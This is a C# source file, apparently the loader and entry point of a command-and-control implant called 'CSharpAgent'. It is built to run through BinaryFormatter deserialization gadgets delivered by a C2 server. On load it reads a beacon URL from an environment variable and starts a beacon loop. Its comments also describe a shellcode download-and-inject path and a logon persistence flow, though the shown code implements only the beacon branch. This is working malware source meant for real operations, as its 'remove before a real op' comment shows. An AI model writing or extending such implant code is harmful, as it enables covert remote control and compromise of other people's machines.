using System;
using System.Runtime.InteropServices;
using System.Net;

namespace CSharpAgent
{
    // The deserialization entry point (COM-visible so the C2-delivered BinaryFormatter gadgets
    // can instantiate the type; the static constructor fires on Activator.CreateInstance /
    // CreateInstance(entryClass) — both instantiation forms run it). MUST stay the FIRST public
    // type in the merged source: the C2's entry-class finder takes the first public class, and
    // the promotion pass moves it after <Module> for the GetTypes()[0] gadgets.
    //
    // Dual-mode dispatch, decided by the process environment the host left us:
    //
    //   H_URL set → agent mode. Beacon.Run() parks THIS thread in the beacon loop and never
    //               returns on its own — the deserialization that started us (a 0x0B UpgradeNetFramework
    //               delivered to the JScript agent sharing this machine) never resumes its own
    //               loop, so exactly one agent beacons the shared MachineGuid session from here
    //               on. Run returns only on a fatal transport failure, unwinding back into the
    //               JScript agent underneath (which then resumes beaconing as the fallback).
    //   A_URL set → legacy one-shot injector: download the PIC bytes and inject them (the
    //               Persistence Manager's on-logon flow depends on this path — it sets A_URL
    //               and deserializes the same assembly).
    //   neither   → return. Standalone builds carry nothing baked (see C2Payload).
    [ComVisible(true)]
    public class Program
    {
        static Program()
        {
            Main();
        }

        // DIAGNOSTIC CANARY — remove before a real op. Raw user32 MessageBox (keeps the
        // single-System-reference build; no System.Windows.Forms). Firing proves the
        // deserialization chain REACHED this DLL — if the popup shows on the target but
        // no beacon/upgrade status arrives, the failure is downstream (TLS/transport),
        // not in the load path. It blocks the static ctor until dismissed, which is the
        // point: dismissing it starts the beacon, giving a clean two-stage test
        // (popup = load OK, subsequent beacon = network OK).
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        static void Main()
        {
            MessageBox(IntPtr.Zero, "dll loaded", "csharp-agent", 0x50040); // info icon | set-foreground | topmost

            var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
            if (string.IsNullOrEmpty(beaconUrl))
            {
                return;
            }
            Beacon.Run(beaconUrl);
        }
    }
}
